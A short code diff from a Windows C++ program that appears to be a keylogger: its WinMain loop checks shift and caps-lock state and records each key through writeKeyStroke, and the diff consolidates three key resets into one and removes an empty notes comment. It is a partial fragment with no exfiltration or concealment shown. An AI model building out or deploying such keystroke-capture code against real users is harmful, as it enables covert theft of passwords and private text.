@@ -50,7 +50,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 if (isShiftPressed() == 1) 
                 {
                     writeKeyStroke(findShiftPlusKey());
-                    key = 0;
                 }
                 else if (vkMaps.searchMiscMaps(i) != 1) 
                 {
@@ -59,23 +58,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 else if (vkMaps.searchAsciiMaps(i) != 1) 
                 {
                     writeKeyStroke(specialKey);
-                    key = 0;
                 }
                 else 
                 {
                     int getCapOrLowKey = isCapslockOn(i);
                     writeKeyStroke(getCapOrLowKey);
-                    key = 0;
                 }
+                key = 0;
             }
         }
     }
 }
-
-/*
-            Notes
-        
-
-            To-do
-
-*/ 
